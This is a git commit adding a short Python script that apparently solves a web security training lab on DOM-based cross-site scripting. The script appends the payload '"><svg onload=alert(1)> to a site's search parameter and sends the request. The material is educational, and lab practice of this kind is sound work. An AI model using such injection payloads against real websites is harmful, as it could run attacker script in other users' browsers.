5c6dc339622d1fe1b66e1b3c00720d69d19a2eb1
PanAdamski <108422861+PanAdamski@users.noreply.github.com>
2024-07-09 15:16:38 +0200

    Add files via upload

---
+++ DOM XSS in document.write sink using source location.search/solution.py
@@ -0,0 +1,20 @@
+import sys
+import requests
+
+def main():
+    if len(sys.argv) != 2:
+        print("Usage: python script.py <URL>")
+        sys.exit(1)
+    
+    base_url = sys.argv[1]
+    modified_url = base_url + "/?search=\"><svg onload=alert(1)>"
+    
+    try:
+        response = requests.get(modified_url)
+        print(f"Modified URL: {modified_url}")
+        print(f"Status code: {response.status_code}")
+    except requests.exceptions.RequestException as e:
+        print(f"An error occurred: {e}")
+
+if __name__ == "__main__":
+    main()
